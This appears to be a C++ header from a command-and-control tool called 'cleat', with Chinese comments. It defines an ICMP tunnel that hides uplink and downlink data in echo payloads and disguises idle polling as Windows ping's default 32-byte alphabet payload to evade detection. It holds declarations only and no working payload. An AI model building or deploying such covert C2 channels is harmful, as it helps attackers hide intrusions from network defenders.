/**
 * @file IcmpWireCodec.hpp
 * @brief ICMP 通道的线格式
 * @details
 * ICMP 没有自定义协议头: 上行 = echo 请求 payload, 下行 = echo 应答 payload;
 * 分片由 `DatagramCodec` 负责。本文件承载两件"形状"相关的事:
 *   1. **cover 伪装**(Plan A 形态仿真): 空上行(探活/空闲轮询)发送 Windows ping
 *      标准字母表 payload('a'..'w' 循环 32B) —— 零长度 ICMP payload 本身就是异常特征。
 *   2. **回显甄别**: 非 C2 目标(普通协议栈)会把 payload 原样回显, 恰等于 cover 的应答
 *      视为"无下行数据"(真实下行分片为密文, 等于 cover 的概率可忽略)。
 *
 * (记录 payload 长度与 `is_cover_alphabet`), 本文件改动后必须回放一致。
 */
#pragma once

#include <cstddef>
#include <cstdint>
#include <vector>

namespace cleat {
namespace icmp {

    /// 分片数据量(≤ 常见 MTU 内安全值; 以太网 MTU 1500 - IP 20 - ICMP 8 = 1472, 取 1400 留余量)
    constexpr size_t kMaxFragPayload = 1400;

    /// Windows ping 标准数据长度(默认 ping = 32B 字母表 payload)
    constexpr size_t kWinPingDataLen = 32;

    /// cover 伪装载荷: 'a'..'w' 循环(与 Windows ping.exe 的默认 payload 形状一致)
    std::vector<uint8_t> WinPingCover();

    /**
     * @brief 回显甄别: 该应答是否恰为 cover(即"无下行数据")
     * @details 判定依据是**应答内容等于 cover 载荷** —— 真实下行分片是密文,
     *          与 cover 相等的概率可忽略。
     */
    bool IsCoverEcho(const std::vector<uint8_t>& reply);

} // namespace icmp
} // namespace cleat
